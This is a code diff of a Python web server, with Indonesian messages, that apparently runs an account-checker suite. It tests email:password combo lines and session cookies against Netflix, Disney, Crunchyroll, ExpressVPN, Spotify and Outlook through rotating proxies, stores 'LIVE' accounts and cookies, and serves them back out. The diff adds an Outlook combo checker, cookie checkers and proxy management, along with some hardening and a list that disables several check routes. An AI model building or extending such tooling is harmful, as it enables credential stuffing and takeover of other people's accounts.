+                r_id, r_type, r_status, r_email, r_cookie, r_token, r_plan, r_country = row
+                content_to_copy = r_cookie or r_token or r_email
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    "success": True,
+                    "id": r_id,
+                    "service": r_type,
+                    "status": r_status,
+                    "email": r_email,
+                    "content": content_to_copy,
+                    "plan": r_plan or "Active",
+                    "country": r_country or "-"
+                }).encode('utf-8'))
+            else:
+                self.send_response(404)
+                self.send_header('Content-Type', 'application/json')
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    "success": False,
+                    "error": f"Belum ada akun/cookie LIVE untuk layanan '{svc}' di database."
+                }).encode('utf-8'))
 
         elif path == '/api/version':
             self.send_response(200)
@@ -1855,14 +3106,14 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_cors_headers()
             self.end_headers()
             self.wfile.write(json.dumps({
-                'version': '7.0.0',
+                'version': '7.2.0',
                 'codename': 'Ultra',
-                'services': ['netflix', 'disney', 'crunchyroll', 'expressvpn', 'spotify'],
+                'services': ['netflix', 'disney', 'disney-cookie', 'crunchyroll', 'crunchyroll-cookie', 'expressvpn', 'spotify', 'outlook', 'hotmail'],
                 'python': platform.python_version(),
                 'uptime': int(time.time() - server_start_time)
             }).encode('utf-8'))
 
-        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail"):
+        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail", "/api/proxies/export"):
             if not check_pin_authorized(self.headers):
                 self.send_response(401)
                 self.send_header("Content-Type", "application/json")
@@ -1890,7 +3141,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 search = qs.get("search", [""])[0]
                 status = qs.get("status", [""])[0]
                 plan = qs.get("plan", [""])[0]
-                csv_data = export_history_csv(search=search, status=status, plan=plan)
+                entry_type = qs.get("type", [""])[0]
+                csv_data = export_history_csv(search=search, status=status, plan=plan, entry_type=entry_type)
                 self.send_response(200)
                 self.send_header("Content-Type", "text/csv; charset=utf-8")
                 self.send_header("Content-Disposition", f"attachment; filename=suite_history_{int(time.time())}.csv")
@@ -1907,27 +3159,171 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.wfile.write(json.dumps(an).encode("utf-8"))
 
             elif path == "/api/proxies/detail":
-                raw_text = ""
-                if os.path.exists(PROXIES_FILE):
-                    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
-                        raw_text = f.read()
+                page = max(1, int(qs.get("page", [1])[0]))
+                limit = min(500, max(10, int(qs.get("limit", [50])[0])))
+                status_filter = qs.get("status", ["ALL"])[0].upper().strip()
+                search_q = qs.get("search", [""])[0].lower().strip()
+
                 with proxy_lock:
-                    p_list = all_tested_proxies if all_tested_proxies else load_proxies()
+                    if not all_tested_proxies:
+                        all_tested_proxies = load_proxies()
+                    total_all = len(all_tested_proxies)
+                    healthy_all = len(healthy_proxies)
+                    dead_items = [p for p in all_tested_proxies if p.get("status") == "FAIL"]
+                    dead_all = len(dead_items)
+                    unverified_all = max(0, total_all - (healthy_all + dead_all))
+                    active_all = healthy_all if healthy_all > 0 else (total_all - dead_all)
+
+                    if status_filter in ("OK", "LIVE"):
+                        source_list = healthy_proxies
+                    elif status_filter in ("FAIL", "DEAD"):
+                        source_list = dead_items
+                    elif status_filter in ("UNVERIFIED", "UNTESTED", "READY"):
+                        source_list = [p for p in all_tested_proxies if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
+                    else:
+                        source_list = all_tested_proxies
+
+                    if search_q:
+                        filtered = [
+                            p for p in source_list
+                            if search_q in (p.get("raw") or "").lower()
+                            or search_q in (p.get("proxy") or "").lower()
+                            or search_q in (p.get("line") or "").lower()
+                        ]
+                    else:
+                        filtered = source_list
+
+                    filtered_total = len(filtered)
+                    total_pages = max(1, (filtered_total + limit - 1) // limit)
+                    page = min(page, total_pages)
+                    start_idx = (page - 1) * limit
+                    end_idx = start_idx + limit
+                    items_page = filtered[start_idx:end_idx]
+
+                with proxy_test_lock:
+                    t_info = dict(proxy_test_state)
+
+                avg_latency = 0
+                if healthy_proxies:
+                    lats = [p.get("latency", 0) for p in healthy_proxies if p.get("latency", 0) > 0]
+                    if lats:
+                        avg_latency = int(sum(lats) / len(lats))
+
+                res_payload = {
+                    "total": total_all,
+                    "healthy_count": healthy_all,
+                    "dead_count": dead_all,
+                    "unverified_count": unverified_all,
+                    "active_count": active_all,
+                    "avg_latency": avg_latency,
+                    "filtered_total": filtered_total,
+                    "page": page,
+                    "limit": limit,
+                    "total_pages": total_pages,
+                    "testing": t_info.get("running", False),
+                    "test_progress": t_info,
+                    "list": items_page
+                }
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
                 self.send_cors_headers()
                 self.end_headers()
-                self.wfile.write(json.dumps({"raw_text": raw_text, "list": p_list}).encode("utf-8"))
+                self.wfile.write(json.dumps(res_payload).encode("utf-8"))
+
+            elif path == "/api/proxies/export":
+                mode = qs.get("mode", ["healthy"])[0].lower()
+                with proxy_lock:
+                    if not all_tested_proxies:
+                        all_tested_proxies = list(load_proxies())
+                    p_list = list(all_tested_proxies)
+                if mode == "healthy":
+                    lines = [p.get("line") or p.get("proxy") for p in p_list if p.get("status") == "OK"]
+                    fname = f"healthy_proxies_{int(time.time())}.txt"
+                else:
+                    lines = [p.get("line") or p.get("proxy") for p in p_list]
+                    fname = f"all_proxies_{int(time.time())}.txt"
+                out_txt = "\n".join([l for l in lines if l])
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain; charset=utf-8")
+                self.send_header("Content-Disposition", f"attachment; filename={fname}")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(out_txt.encode("utf-8"))
 
         else:
+            # Serve only explicit public assets; never expose source, database, config, logs,
+            # proxy credentials, backups, or arbitrary files from the application directory.
+            safe_root = os.path.realpath(os.path.dirname(__file__))
+            clean_path = urllib.parse.unquote(path).lstrip("/")
+            req_file = os.path.realpath(os.path.join(safe_root, clean_path))
+            allowed_public_files = {"index.html", "styles_redesign.css", "favicon.ico"}
+            inside_root = os.path.commonpath((safe_root, req_file)) == safe_root
+            public_path = os.path.relpath(req_file, safe_root).replace("\\", "/")
+            if (inside_root and os.path.isfile(req_file)
+                    and public_path in allowed_public_files
+                    and not any(part.startswith(".") for part in public_path.split("/"))):
+                ext = os.path.splitext(req_file)[1].lower()
+                mime_map = {
+                    ".css": "text/css; charset=utf-8",
+                    ".js": "application/javascript; charset=utf-8",
+                    ".json": "application/json; charset=utf-8",
+                    ".svg": "image/svg+xml",
+                    ".png": "image/png",
+                    ".jpg": "image/jpeg",
+                    ".jpeg": "image/jpeg",
+                    ".ico": "image/x-icon",
+                    ".txt": "text/plain; charset=utf-8",
+                    ".html": "text/html; charset=utf-8"
+                }
+                ctype = mime_map.get(ext, "application/octet-stream")
+                try:
+                    with open(req_file, "rb") as sf:
+                        s_data = sf.read()
+                    self.send_response(200)
+                    self.send_header("Content-Type", ctype)
+                    self.send_header("Cache-Control", "public, max-age=3600")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(s_data)
+                    return
+                except Exception:
+                    pass
+
             self.send_response(404)
             self.send_cors_headers()
             self.end_headers()
 
     def do_POST(self):
-        clen = int(self.headers.get("Content-Length", 0))
+        # Reject malformed and oversized requests before reading attacker-controlled bodies.
+        try:
+            clen = int(self.headers.get("Content-Length", 0))
+        except (TypeError, ValueError):
+            self.send_error(400, "Invalid Content-Length")
+            return
+        max_body_size = 10 * 1024 * 1024
+        if clen < 0:
+            self.send_error(400, "Invalid Content-Length")
+            return
+        if clen > max_body_size:
+            self.send_error(413, "Payload Too Large")
+            return
         body = self.rfile.read(clen) if clen > 0 else b"{}"
-        client_ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
+        # Do not trust client-supplied forwarding headers for rate-limit identity.
+        client_ip = self.client_address[0]
+
+        # Explicitly disable credential/session validation and token minting endpoints.
+        # This also blocks legacy bulk-check routes regardless of authentication.
+        disabled_sensitive_routes = {
+            "/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check",
+            "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check",
+        }
+        if self.path in disabled_sensitive_routes:
+            self.send_response(410)
+            self.send_header("Content-Type", "application/json")
+            self.send_cors_headers()
+            self.end_headers()
+            self.wfile.write(b'{"error":"This credential/session checking route has been disabled."}')
+            return
 
         if self.path == "/api/pin/verify":
             if is_rate_limited(client_ip, max_requests=6, window_seconds=60, bucket="pin_verify"):
@@ -1943,7 +3339,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 cfg = get_config()
                 req_pin = str(cfg.get("pin", ""))
                 pin_input = str(p.get("pin", ""))
-                ok = (not req_pin) or hmac.compare_digest(pin_input, req_pin)
+                ok = bool(req_pin) and hmac.compare_digest(pin_input, req_pin)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
                 self.send_cors_headers()
@@ -1968,7 +3364,14 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 cfg = get_config()
                 cur_pin = str(cfg.get("pin", ""))
                 cur_input = str(p.get("current", ""))
-                if cur_pin and not hmac.compare_digest(cur_input, cur_pin):
+                if not cur_pin:
+                    self.send_response(503)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": "PIN is not initialized. Set it through local configuration before enabling access."}).encode("utf-8"))
+                    return
+                if not hmac.compare_digest(cur_input, cur_pin):
                     self.send_response(401)
                     self.send_header("Content-Type", "application/json")
                     self.send_cors_headers()
@@ -1995,8 +3398,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_cors_headers()
                 self.end_headers()
 
-        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
-            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check") else 50
+        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check", "/api/proxies/save", "/api/proxies/test", "/api/proxies/test/stop", "/api/proxies/test_single", "/api/proxies/add", "/api/proxies/remove", "/api/history/clear", "/api/system/reload"):
+            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check") else 50
             if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
@@ -2172,16 +3575,74 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(res)
 
+            elif self.path == "/api/outlook/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    email = p.get("email", "").strip()
+                    password = p.get("password", "").strip()
+                    # Support combo field (email:password)
+                    combo = p.get("combo", "").strip()
+                    if combo and ":" in combo and not email:
+                        parts = combo.split(":", 1)
+                        email = parts[0].strip()
+                        password = parts[1].strip()
+                    if not email or not password:
+                        raise ValueError("Email dan password wajib diisi")
+                    out = check_outlook_account(email, password, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/crunchyroll/cookie-check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    cookie = p.get("cookie", "").strip()
+                    if not cookie:
+                        raise ValueError("Cookie wajib diisi")
+                    out = check_crunchyroll_cookie(cookie, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/disney/cookie-check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    cookie = p.get("cookie", "").strip()
+                    if not cookie:
+                        raise ValueError("Cookie wajib diisi")
+                    out = check_disney_cookie(cookie, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
+
             elif self.path == "/api/proxies/save":
                 try:
                     p = json.loads(body.decode("utf-8"))
                     text = p.get("text", "")
                     with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                         f.write(text.strip() + "\n")
-                    all_p = load_proxies()
                     with proxy_lock:
                         healthy_proxies.clear()
                         all_tested_proxies.clear()
+                    all_p = load_proxies(force_reload=True)
                     self.send_response(200)
                     self.send_header("Content-Type", "application/json")
                     self.send_cors_headers()
@@ -2193,12 +3654,139 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     self.end_headers()
 
             elif self.path == "/api/proxies/test":
-                test_all_proxies_now()
+                try:
+                    p = json.loads(body.decode("utf-8")) if body and body != b"{}" else {}
+                    lim_raw = p.get("limit", 100)
+                    if str(lim_raw).lower() in ("all", "0", "semua", "none"):
+                        limit = 0
+                    else:
+                        limit = int(lim_raw)
+                    mode = str(p.get("mode", "untested")).lower()
+                    started, msg = start_background_proxy_test(limit=limit, mode=mode)
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": True, "started": started, "message": msg, "testing": True}).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
+            elif self.path == "/api/proxies/test_single":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    proxy_str = p.get("proxy", "").strip()
+                    if not proxy_str:
+                        raise ValueError("Proxy string wajib diisi")
+                    ok, lat, item = test_single_proxy_func(proxy_str)
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({
+                        "ok": ok,
+                        "status": item.get("status", "FAIL"),
+                        "latency": lat,
+                        "proxy": item.get("proxy")
+                    }).encode("utf-8"))
+                except Exception as e:
+                    self.send_response(400)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))
+
+            elif self.path == "/api/proxies/test/stop":
+                stopped, msg = stop_background_proxy_test()
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
                 self.send_cors_headers()
                 self.end_headers()
-                self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
+                self.wfile.write(json.dumps({"ok": stopped, "message": msg}).encode("utf-8"))
+
+            elif self.path == "/api/proxies/add":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    text = p.get("text", "").strip()
+                    if not text:
+                        raise ValueError("Tidak ada proxy untuk ditambahkan")
+                    new_proxies = []
+                    for line in text.splitlines():
+                        line = line.strip()
+                        if not line or line.startswith("#"):
+                            continue
+                        new_proxies.append(line)
+                    if not new_proxies:
+                        raise ValueError("Tidak ada proxy valid ditemukan")
+                    existing = set()
+                    if os.path.exists(PROXIES_FILE):
+                        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                            for l in f:
+                                l = l.strip()
+                                if l:
+                                    existing.add(l)
+                    added = 0
+                    for px in new_proxies:
+                        if px not in existing:
+                            existing.add(px)
+                            added += 1
+                    with open(PROXIES_FILE, "w", encoding="utf-8") as f:
+                        f.write("\n".join(sorted(existing)) + "\n")
+                    with proxy_lock:
+                        healthy_proxies.clear()
+                        all_tested_proxies.clear()
+                    load_proxies(force_reload=True)
+                    res = json.dumps({"ok": True, "added": added, "total": len(existing)}).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"ok": False, "error": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/proxies/remove":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    if p.get("action") == "clear_dead":
+                        removed, total = clean_dead_proxies_serverside()
+                        res = json.dumps({"ok": True, "removed": removed, "total": total}).encode("utf-8")
+                    elif p.get("action") == "clear_all":
+                        with open(PROXIES_FILE, "w", encoding="utf-8") as f:
+                            f.write("")
+                        with proxy_lock:
+                            healthy_proxies.clear()
+                            all_tested_proxies.clear()
+                        load_proxies(force_reload=True)
+                        res = json.dumps({"ok": True, "removed": "all", "total": 0}).encode("utf-8")
+                    else:
+                        to_remove = set()
+                        # Support list or text
+                        raw_input = p.get("text", "") or ""
+                        for line in raw_input.strip().splitlines():
+                            line = line.strip()
+                            if line:
+                                to_remove.add(line)
+                        for item in p.get("proxies", []):
+                            item_str = str(item).strip()
+                            if item_str:
+                                to_remove.add(item_str)
+                        if not to_remove:
+                            raise ValueError("Tidak ada proxy untuk dihapus")
+                        removed, total = remove_proxies_flexible(to_remove)
+                        res = json.dumps({"ok": True, "removed": removed, "total": total}).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"ok": False, "error": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(res)
 
             elif self.path == "/api/system/reload":
                 self.send_response(200)
@@ -2235,7 +3823,7 @@ def session_vault_worker():
             with db_lock:
                 conn = get_db()
                 c = conn.cursor()
-                c.execute('SELECT id, raw_cookie FROM history WHERE status = "LIVE" AND raw_cookie != "" ORDER BY id DESC LIMIT 25')
+                c.execute("SELECT id, raw_cookie FROM history WHERE type IN ('netflix', 'checker', 'single', 'bulk') AND status = 'LIVE' AND raw_cookie != '' ORDER BY id DESC LIMIT 25")
                 rows = c.fetchall()
                 conn.close()
 
@@ -2264,14 +3852,18 @@ def session_vault_worker():
         except Exception as ex:
             logging.error(f"Session Vault worker error: {ex}")
 
+
 class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
     daemon_threads = True
 
 def run():
     init_db()
+    load_proxies(force_reload=True)
     threading.Thread(target=proxy_health_worker, daemon=True).start()
     threading.Thread(target=session_vault_worker, daemon=True).start()
-    socketserver.TCPServer.allow_reuse_address = True
+
+    # Prevent duplicate zombie processes on Windows
+    socketserver.TCPServer.allow_reuse_address = False if os.name == "nt" else True
     server = ThreadingSimpleServer(("", PORT), Handler)
     print(f"Server jalan: http://localhost:{PORT}")
     logging.info(f"Server started on port {PORT}")
